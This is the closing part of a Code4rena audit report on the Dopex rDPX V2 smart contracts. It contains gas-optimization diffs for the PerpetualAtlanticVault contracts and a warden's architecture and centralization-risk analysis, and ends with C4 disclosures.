315:  function settle(

328:    for (uint256 i = 0; i < optionIds.length; i++) {

346:    // Transfer collateral token from perpetual vault to rdpx rdpxV2Core
347:    collateralToken.safeTransferFrom(
348:      addresses.perpetualAtlanticVaultLP,
349:      addresses.rdpxV2Core,
350:      ethAmount
351:    );
352:    // Transfer rdpx from rdpx rdpxV2Core to perpetual vault
353:    IERC20WithBurn(addresses.rdpx).safeTransferFrom(
354:      addresses.rdpxV2Core,
355:      addresses.perpetualAtlanticVaultLP,
356:      rdpxAmount
357:    );

359:    IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).subtractLoss(
360:      ethAmount
361:    );
362:    IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP)
363:      .unlockLiquidity(ethAmount);
364:    IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).addRdpx(
365:      rdpxAmount
366:    );
```

```diff
diff --git a/contracts/perp-vault/PerpetualAtlanticVault.sol b/contracts/perp-vault/PerpetualAtlanticVault.sol
index 88ac2b3..941da6b 100644
--- a/contracts/perp-vault/PerpetualAtlanticVault.sol
+++ b/contracts/perp-vault/PerpetualAtlanticVault.sol
@@ -324,6 +324,7 @@ contract PerpetualAtlanticVault is
     _isEligibleSender();

     updateFunding();
+    address _perpetualAtlanticVaultLP = addresses.perpetualAtlanticVaultLP;

     for (uint256 i = 0; i < optionIds.length; i++) {
       uint256 strike = optionPositions[optionIds[i]].strike;
@@ -345,23 +346,23 @@ contract PerpetualAtlanticVault is

     // Transfer collateral token from perpetual vault to rdpx rdpxV2Core
     collateralToken.safeTransferFrom(
-      addresses.perpetualAtlanticVaultLP,
+      _perpetualAtlanticVaultLP,
       addresses.rdpxV2Core,
       ethAmount
     );
     // Transfer rdpx from rdpx rdpxV2Core to perpetual vault
     IERC20WithBurn(addresses.rdpx).safeTransferFrom(
       addresses.rdpxV2Core,
-      addresses.perpetualAtlanticVaultLP,
+      _perpetualAtlanticVaultLP,
       rdpxAmount
     );

-    IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).subtractLoss(
+    IPerpetualAtlanticVaultLP(_perpetualAtlanticVaultLP).subtractLoss(
       ethAmount
     );
-    IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP)
+    IPerpetualAtlanticVaultLP(_perpetualAtlanticVaultLP)
       .unlockLiquidity(ethAmount);
-    IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).addRdpx(
+    IPerpetualAtlanticVaultLP(_perpetualAtlanticVaultLP).addRdpx(
       rdpxAmount
     );

```

## [G-10] We can avoid reading from state here

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L113-L124

**This is a different finding from the bot**
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
113:  constructor(
114:    string memory _name,
115:    string memory _symbol,
116:    address _collateralToken,
117:    uint256 _gensis
118:  ) ERC721(_name, _symbol) {
119:    _validate(_collateralToken != address(0), 1);

121:    collateralToken = IERC20WithBurn(_collateralToken);
122:    underlyingSymbol = collateralToken.symbol();
123:    collateralPrecision = 10 ** collateralToken.decimals();
124:    genesis = _gensis;
```

```diff
diff --git a/contracts/perp-vault/PerpetualAtlanticVault.sol b/contracts/perp-vault/PerpetualAtlanticVault.sol
index 88ac2b3..4a58e0e 100644
--- a/contracts/perp-vault/PerpetualAtlanticVault.sol
+++ b/contracts/perp-vault/PerpetualAtlanticVault.sol
@@ -119,8 +119,8 @@ contract PerpetualAtlanticVault is
     _validate(_collateralToken != address(0), 1);

     collateralToken = IERC20WithBurn(_collateralToken);
-    underlyingSymbol = collateralToken.symbol();
-    collateralPrecision = 10 ** collateralToken.decimals();
+    underlyingSymbol = IERC20WithBurn(_collateralToken).symbol();
+    collateralPrecision = 10 ** IERC20WithBurn(_collateralToken).decimals();
     genesis = _gensis;
```

## [G-11] Since we have cached values, we should reference them instead of making a state read

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L101-L107
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVaultLP.sol
101:    rdpx = _rdpx;
102:    collateral = ERC20(_collateral);

106:    collateral.approve(_perpetualAtlanticVault, type(uint256).max);
107:    ERC20(rdpx).approve(_perpetualAtlanticVault, type(uint256).max);
```

Note, we have the values , `_rdpx and ERC20(_collateral)`, instead of calling their state counterparts `rpdx and collateral` we should utilize the local ones(Even better we could have just changed them into immutable)

```diff
-    collateral.approve(_perpetualAtlanticVault, type(uint256).max);
-    ERC20(rdpx).approve(_perpetualAtlanticVault, type(uint256).max);
+    ERC20(_collateral).approve(_perpetualAtlanticVault, type(uint256).max);
+    ERC20(_rdpx).approve(_perpetualAtlanticVault, type(uint256).max);
```

## Conclusion

It is important to emphasize that the provided recommendations aim to enhance the efficiency of the code without compromising its readability. We understand the value of maintainable and easily understandable code to both developers and auditors.

As you proceed with implementing the suggested optimizations, please exercise caution and be diligent in conducting thorough testing. It is crucial to ensure that the changes are not introducing any new vulnerabilities and that the desired performance improvements are achieved. Review code changes, and perform thorough testing to validate the effectiveness and security of the refactored code.

Should you have any questions or need further assistance, please don't hesitate to reach out.

**[witherblock (Dopex) confirmed](https://github.com/code-423n4/2023-08-dopex-findings/issues/1942#issuecomment-1742026115)**

*Note: for full discussion, see [here](https://github.com/code-423n4/2023-08-dopex-findings/issues/1942).*

***
# Audit Analysis

For this audit, 14 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-08-dopex-findings/issues/1887) by **catellatech** received the top score from the judge.

*The following wardens also submitted reports: [nirlin](https://github.com/code-423n4/2023-08-dopex-findings/issues/1988), [\_\_141345\_\_](https://github.com/code-423n4/2023-08-dopex-findings/issues/1795), [RED-LOTUS-REACH](https://github.com/code-423n4/2023-08-dopex-findings/issues/1498), [0xSmartContract](https://github.com/code-423n4/2023-08-dopex-findings/issues/995), [mark0v](https://github.com/code-423n4/2023-08-dopex-findings/issues/2022), [bitsurfer](https://github.com/code-423n4/2023-08-dopex-findings/issues/2003), [hunter\_w3b](https://github.com/code-423n4/2023-08-dopex-findings/issues/1927), [Sathish9098](https://github.com/code-423n4/2023-08-dopex-findings/issues/1841), [LokiThe5th](https://github.com/code-423n4/2023-08-dopex-findings/issues/1338), [rjs](https://github.com/code-423n4/2023-08-dopex-findings/issues/1158), [rokinot](https://github.com/code-423n4/2023-08-dopex-findings/issues/849), [0xnev](https://github.com/code-423n4/2023-08-dopex-findings/issues/637), and [K42](https://github.com/code-423n4/2023-08-dopex-findings/issues/486).*

## Description overview of Dopex Protocol

The `Dopex protocol` has introduced a new version called `rDPX V2`, which brings an interesting way to reward those who `write options` on their platform using a rebate system. Additionally, they've created a new synthetic coin called `dpxETH`, which is tied to the price of `ETH`. The idea behind this coin is to use it for earning higher yields with `ETH` and as a collateral asset for future options products on `Dopex`.

The bonding process in `rDPX V2` is how new `dpxETH` coins can be created. When someone bonds, they receive a `"receipt"` that represents a combination of `ETH` and `dpxETH` in a system called `Curve`. Through this bonding process, new `dpxETH` coins are minted, and to ensure they always have backing, there are `reserves` of `rDPX` and `ETH` called `"Backing Reserves."` These reserves are controlled by entities called `"AMOs."`

To achieve a safe and controlled scaling of `rDPX V2` and `dpxETH`, the protocol has adopted an idea called `"AMO ideology"` from `Frax Finance`, which is another similar project. Essentially, they are drawing inspiration from how `Frax Finance` manages its system to ensure that the new version of `Dopex` can grow and operate in a stable and sustainable manner.

![Dopex1](https://user-images.githubusercontent.com/131902879/282842423-6be2d687-e65b-4a3b-bf38-df6be8ec5054.png)

## Summary

![Dopex2](https://user-images.githubusercontent.com/131902879/282842588-70cc6c98-b0bc-4459-82e8-226923e8a5d9.png)

## 1- Approach we followed when reviewing the code

To begin, we assessed the code's scope, which guided our approach to reviewing and analyzing the project.

### **Scope**

- 1. **UniV2LiquidityAMO.sol**:

  - This contract is utilized to manage liquidity in the `Uniswap V2` token pair, as well as to execute automated exchange operations. The contract encompasses administrative functions, AMO (Automated Market Maker Operator) functions, and view functions to oversee a variety of liquidity-related operations and token exchanges.

- 2. **UniV3LiquidityAmo.sol**:

  - This contract is designed to interact with the `Uniswap V3` protocol and perform liquidity management operations.

- 3. **RdpxV2Core.sol**:

  - This contract is the core of the protocol and is responsible for managing crucial operations such as interacting with `delegates`, `asset management`, `option settlement`, `balance synchronization`, and `repeg handling`. Internal `_validate` functions are used to check conditions throughout the contract and generate exceptions if a condition is not met. This contract ensures that operations are carried out in an authorized manner and in accordance with predefined protocol rules.

- 4. **RdpxV2Bond.sol**:

  - this contract defines an `ERC721-based` NFT token with the ability to `mint` new tokens, `pause/unpause` token transfers, and enforce checks during token transfers. It leverages functionality from various `OpenZeppelin` contracts to implement these features.

- 5. **RdpxDecayingBonds.sol**:
  - `RdpxDecayingBonds` contract provides a way to `mint` and manage decaying `rDPX bonds` as non-fungible tokens. Users with specific roles can create bonds, perform emergency withdrawals, and query the bonds they own. The contract is designed to be paused in critical situations and features a structure that ensures security and control over operations at all times.
- 6. **DpxEthToken.sol**:

  - This contract defines a synthetic token with `ERC-20` functionalities and adds features for `pausing`, `minting`, and `burning` tokens. The contract leverages `role-based` access control to manage the interactions and operations on the token.

- 7. **PerpetualAtlanticVault.sol**:

  - This contract represent a vault for perpetual atlantic `rDPX` PUT options. It is designed to handle option issuance, settlement, and funding calculation. The contract utilizes various roles and `OpenZeppelin` libraries to ensure its functionality and security.

- 8. **PerpetualAtlanticVaultLP.sol**:

  - this contract handles liquidity provision for the `PerpetualAtlanticVault` contract, allowing users to deposit and withdraw assets, while also managing aspects related to the `PerpetualAtlanticVault` contract and calculating conversions and previews for operations. And use the standard `ERC4626`.

- 9. **ReLPContract.sol**:
  - this contract manages the process of `re-liquidity` provisioning for a DEX pair using the `Uniswap V2` protocol. It calculates the optimal amount of Token A `reLP` to remove from the pool, performs swaps, and adds the new liquidity back to the pool. The contract is designed to ensure efficient and accurate `re-liquidity` provision while syncing balances with other relevant contracts.

### Privileged Roles 
There are several important roles in the system.

- **DEFAULT\_ADMIN_ROLE**: This role is essential in every contract. It grants administrative permissions and control over critical functions. The holder of this role can manage other roles, configure contract parameters, and perform various administrative tasks.
```Solidity
 constructor() {
    _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
  }

```
- **MANAGER\_ROLE**: This role is present in the [PerpetualAtlanticVault](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol) contract. It is used for general contract management, including setting addresses, adjusting parameters, and controlling administrative functions. The manager role helps ensure proper operation and configuration.
```Solidity
 bytes32 public constant MANAGER_ROLE = keccak256("MANAGER_ROLE");
```
- **MINTER\_ROLE** - **PAUSER\_ROLE** - **BURNER\_ROLE** :Found in contracts like [DpxEthToken](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/dpxETH/DpxEthToken.sol), [RdpxDecayingBonds](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol) and [RdpxV2Bond](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Bond.sol) this role permits the creation or minting of new tokens or bonds. It's important for controlling the issuance of new tokens, maintaining the token supply, and potentially providing incentives.
```Solidity
  bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
  bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
  bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");
```

Initially, the `accounts` responsible for fully controlling these `roles` will be managed by the `Dopex` team as confirmed by the sponsor 
```shell
Psytama — 31/08/2023 at 7:24. 
Yes, they will be controlled by the protocol through a multisig. 
```
Given the level of control that these `roles` possess within the system, users must place full trust in the fact that the entities overseeing these `roles` will always act correctly and in the best interest of the `system` and its `users`.

After grasping the code's functionality, we carefully analyzed and audited it step by step. Our goal was to ensure its security and proper operation.

## 2- Analysis of the code base

The main most important contracts of `rDPX V2`.

- Here's a detailed diagrams of the essential components of these contracts:

### 1. RdpxV2Core:

![Dopex3Core](https://user-images.githubusercontent.com/131902879/282842945-68a7291a-dbc3-46eb-8923-43e608d7832a.png)

### 2. PerpetualAtlanticVault:

![Dopex4](https://github.com/catellaTech/dopex/blob/main/Dopex4.drawio.png?raw=true)

### 3. PerpetualAtlanticVaultLP:

![Dopex5LP](https://user-images.githubusercontent.com/131902879/282843030-b409b8d3-f285-43ce-8784-74b39a6d993a.png)

### 4. UniV3LiquidityAmo:

![Dopex7UniV3](https://user-images.githubusercontent.com/131902879/282843123-c6da1ece-4cb8-46e5-a3a5-32447ef4c618.png)

### 5. RdpxV2Bond:

![Dopex8Bond](https://user-images.githubusercontent.com/131902879/282843235-5e39e9cb-231f-4e01-85ce-d1e5f7337611.png)

### 6. RdpxDecayingBonds:

![Dopex9Decay](https://user-images.githubusercontent.com/131902879/282843352-f1728226-acf4-477a-bf99-d31099c6c023.png)

### 7. ReLPContract:

![Dopex10reLP](https://user-images.githubusercontent.com/131902879/282843418-0ee998e9-811c-4673-a542-1ee22b718053.png)

### What's unique? What's using existing patterns?

- **Unique Features**:
  - *Decaying Bonds*: Issuance of `ERC721` decaying bonds offering rebates and indirect `rDPX` emission.

- **Utilization of Existing Patterns**:
  - *Token Standards*: `ERC721` and `ERC20` token standards for bonds, `LP tokens`, and assets.
  - *Liquidity Pools and AMOs*: Utilizing `Uniswap V2` and `V3 functions` for liquidity and `AMO` operations.
  - *Staking and Rewards*: Implementing staking and proportional rewards mechanisms.
  - *Oracle Integration*: Using oracles for accurate price information.
  - *Access Control*: `Role-based` access control for secure interactions.
  - *Strategy Contracts*: Automating liquidity provision with strategy contracts.

## 3- Architecture of the rDPX V2

This diagram illustrates how the different contracts and modules interact within the `rDPX V2` ecosystem.

![Dopex6Arqui](https://user-images.githubusercontent.com/131902879/282843565-9aa03baa-35d7-423d-98a9-4726f3a6a014.png)

- **How a user interacts** 🧑‍💻:
  Users interact with the `rDPX V2` through their actions, such as:

  - **`Bonding and Interaction with Core Modules`**:

    - A user can initiate bonding processes through the Bonding Module. They can acquire `rDPX` Bond tokens, which represent their bond balance.
    - The user can interact with the Peg Stability module indirectly by participating in bonding processes. The module aims to maintain the peg of `dpxETH`.
    - Users can engage with the Backing Reserves module by providing reserves (such as `rDPX` or `ETH`) to be used by Automated Market Operators (AMOs)..

  - **`Liquidity Provision and Yield Generation`**:

    - Users can provide liquidity to the `AtlanticPerpetualPoolLP`, contributing to the liquidity of the `AtlanticPerpetualPool`.
    - By adding liquidity, users earn rewards which they can stake in the `AtlanticPerpetualPoolStaking` contract for further yield.

  - **`Option Trading`**:

    - Users can mint option tokens (NFTs) by interacting with the `AtlanticPerpetualPool` contract.
    - These option tokens can be traded or used for various purposes within the ecosystem.

  - **`Decaying Bonds and Loss Mitigation`**:

    - If a user experiences losses from Dopex Option Products, they might receive decaying bonds from the rDPX Decaying Bonds contract. These bonds act as a rebate for their losses.

  - **`Staking and Yield Farming`**:

    - Users can stake `RdpxV2ReceiptToken` in the `RdpxV2ReceiptTokenStaking` contract to earn boosted yields from the `Curve LP` and `DPX incentives`.

  - **`Utilizing Oracles`**:

    - Users can access real-time price information from the `dpxETH/ETH` Oracle and `rDPX/ETH` Oracle to make informed decisions.

  - **`AMO Interaction`**:

    - If users wish to use `Uniswap V2` or `V3 functions`, they can do so through the respective `AMO` contracts. This involves actions like `adding` or `removing` liquidity and `making swaps`.

  - **`Redeeming Rewards and Tokens`**:
    - Users can redeem rewards earned from staking, providing liquidity, or participating in other activities within the ecosystem.

## 4- Documents

- The documentation of the `Dopex rDPX V2` project is quite comprehensive and detailed, providing a solid overview of how `rDPX V2` is structured and how its various aspects function. However, we have noticed that there is room for additional details, such as `diagrams`, to gain a deeper understanding of how different contracts interact and the functions they implement. With considerable enthusiasm, we have dedicated several days to creating diagrams for each of the contracts. 
We are confident that these diagrams will bring significant value to the protocol as they can be seamlessly integrated into the existing `documentation`, enriching it and providing a more comprehensive and detailed understanding for `users`, `developers` and `auditors`.

- We suggest including high-quality articles on `Medium`, as it's an excellent way to provide an in-depth understanding of many project topics, and it's a common practice in many blockchain projects.

## 5- Systemic & Centralization Risks

Here's an analysis of potential systemic and centralization risks in the provided contracts:

### UniV2LiquidityAmo:

- **Systemic Risks**:

  - Calculation errors in exchange and liquidity operations.
  - Authorization mistakes and manipulation vulnerabilities.
  - Errors in swaps and reliance on price oracles.

- **Centralization Risks**:
  - Dependency on external contracts and administrator control.

### UniV3LiquidityAmo:

- **Systemic Risks**:

  - Calculation errors and oracle dependency.
  - Unintended position changes due to mistakes.

- **Centralization Risks**:
  - Administrator control and reliance on external contracts.

### RdpxV2Core:

- **Systemic Risks**:

  - Centralized control and oracle dependence (The oracle is out the scope in this audit, but we recommend to consider auditing and make code reviews in those contracts).
  - Delegation mechanism and `AMO` dependency.

- **Centralization Risks**:
  - Administrator control over `pause` and `withdrawal`.
  - Minting control and reliance on external contracts.

### RdpxV2Bond:

**Centralization Risks**:

- Minting control and `bond` amount.
- `Ownership` and contract governance.

### RdpxDecayingBonds:

- **Systemic Risks**:
  - Vulnerability in `emergencyWithdraw()` function could lead to fund loss during emergencies.
  - Improper implementation or malicious exploitation of `pausing` could disrupt contract functionality.
  - Interaction with external contracts introduces security and behavior risks.
  - Lack of mechanisms to limit bond supply may cause unintended inflation.

**Centralization Risks**:

- Admin's control over pausing and withdrawal might centralize power.
- Concentrated `MINTER_ROLE` control could lead to centralized `bond` issuance.
- Centralized `RDPXV2CORE_ROLE` control might impact `bond` adjustments.
- Absence of governance could centralize `upgrade` decisions.
- Initial `deployer's role ownership` could centralize contract control.

### DpxEthToken:

- **Systemic Risks**:

  - Lack of burn limits and reliance on external contracts.

- **Centralization Risks**:
  - Administrator control and centralized role assignment.

### PerpetualAtlanticVault:

- **Systemic Risks**:

  - Funding calculation errors and stale data.
  - External contract dependencies and reentrancy.

- **Centralization Risks**:
  - `Manager role` control and `administrator` authority.
  - `Whitelist` control and contract upgrades.

### PerpetualAtlanticVaultLP:

- **Systemic and Centralization Risks**:
  - Centralized control due to dependency on `perpetualAtlanticVault` contract.
  - Vulnerabilities in external contracts and `liquidity` risk.

### ReLPContract:

- **Systemic Risks**:

  - `Slippage` tolerance risk and `role` centralization.

- **Centralization Risks**:
  - Administrator control and dependence on external contracts.

These summaries outline the major risks that each contract is exposed to in relation to potential `system-wide` problems and `concentration of control`.

### **Dependency risk**:
   - We observed that old and unsafe versions of Openzeppelin are used in the project, this should be updated to the latest one:

  ```solidity
      package.json#L4
      4: "version": "4.9.0",
  ```
  - Latest is `4.9.3` (as of July 28, 2023), version used in project is `4.9.0`
  - You can read more of this issue in our `QA`.

## 6- New insights and learning from this audit

Our new insights from this `Dopex rDPX V2` protocol audit have been exponential. We have learned about the intricate `bonding mechanisms`, including `regular`, `delegate`, and `decaying bonds`, which cater to various scenarios but require user understanding. Inspired by `Frax Finance`, Algorithmic Market Operations `AMOs` are integrated to mitigate risks. The addition of `perpetual options` and increased `yield` issuance for `receipt token` holders aims to incentivize participation. Governance-controlled parameters ensure adaptability, but effective governance is essential. The `fee` structure of the `redemption mechanism` impacts liquidity. The implementation strategy emphasizes initial liquidity and participation.

## 7- Test analysis

The audit scope of the contracts to be reviewed is 95%, with the aim of reaching 100%. However, the tests provided by the protocol are at a high level of comprehension, giving us the opportunity to easily conduct Proof of Concepts `(PoCs)` to test certain bugs present in the project.

### How Could They Have Improved?

While the provided codes seems to be functional, there are always areas for improvement to ensure better security, efficiency, and readability in both the contracts and the protocol.

- Here are some potential areas for improvement:

  1. **Modularization and Separation of Concerns**:

     - The contract `RdpxV2Core` code is lengthy and contains many functions in a single unit. Consider separating different responsibilities into smaller, specific modules.
       For example, you can create modules for:
       - Bond handling
       - Delegate interaction
       - Price calculations etc.

     This will improve code readability and maintainability.

  2. **Comments and Detailed Documentation**:

     - While the code has comments, certain sections may necessitate more comprehensive explanations, such as the `Execute` function in the `UniV3LiquidityAmo.sol` contract.

     It is recommended to document it as per the instructions provided by the sponsor in the Discord DM:

     ```Shell
     psytama — 22/08/2023 21:18
         - "We just added a generic proxy function in case an unforeseeable situation arises; we would utilize it"
     ```

     Enhance the clarity and comprehensibility of the code by incorporating explicit and elucidative comments for every function and segment. This practice will not only enhance understanding but also facilitate seamless maintenance.

  3. **Structured Comments**:
     - Use structured comments, such as standardized function headers (NATS), to describe the function, its parameters, returns, and behavior. This will make the code more understandable for other developers.

## Conclusion

In general, the `Dopex rDPX V2 project` exhibits an interesting and well-developed architecture we believe the team has done a good job regarding the code, but the identified risks need to be addressed, and measures should be implemented to protect the protocol from potential malicious use cases. It is also highly recommended that the team continues to invest in security measures such as mitigation reviews, audits, and bug bounty programs to maintain the security and reliability of the project.

### Time Spent ⏱

A total of `8 days` were dedicated to completing this audit, distributed as follows:

1. 1st Day: Devoted to comprehending the protocol's functionalities and implementation.
2. 2nd Day: Initiated the analysis process, leveraging the documentation offered by the `Dopex Protocol`.
3. 3nd Day & 4rd Day: We dedicated ourselves to taking notes while reading through the contracts line by line.
4. 5th Day: From the notes taken, we decided what goes into the QA report and started it.
5. 6th Day: After finishing the QA, we started with some PoCs that we wanted to do to confirm our doubts about certain functions.
6. 7th Day: We focused on writing the reports for the medium findings we discovered.
7. 8rd Day: Focused on conducting a thorough analysis, incorporating meticulously crafted diagrams derived from the contracts and the note taken by us.

***


# Disclosures

C4 is an open organization governed by participants in the community.

C4 Auditss incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
